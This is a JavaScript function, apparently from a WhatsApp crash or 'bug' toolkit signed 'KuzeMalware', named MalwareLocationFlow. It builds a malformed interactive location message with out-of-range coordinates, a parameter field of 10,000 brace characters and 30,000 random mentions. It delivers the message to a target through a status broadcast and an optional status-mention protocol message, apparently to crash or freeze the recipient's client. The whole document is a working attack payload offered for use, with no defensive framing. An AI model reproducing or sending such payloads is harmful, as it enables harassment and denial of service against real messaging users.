async function MalwareLocationFlow(targetJids, mention = false) {
  try {
    const LocationFlowX1 = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " ",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "🔞 (Malware - 202)",
                address: "꧀꧀꧀꧀꧀꧀꧀꧀꧀꧀",
              },
            },
            body: {
              text: " ",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: targetJids,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 30000 }, () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    const msg = await generateWAMessageFromContent(targetJids, LocationFlowX1, {});

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [targetJids],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: targetJids },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });

    if (mention) {
      await sock.relayMessage(
        targetJids,
        {
          statusMentionMessage: {
            message: {
              protocolMessage: {
                key: msg.key,
                type: 25,
              },
            },
          },
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "true" },
              content: undefined,
            },
          ],
        }
      );
    }
  } catch (err) {
    console.log(err);
  }
}
© KuzeMalware
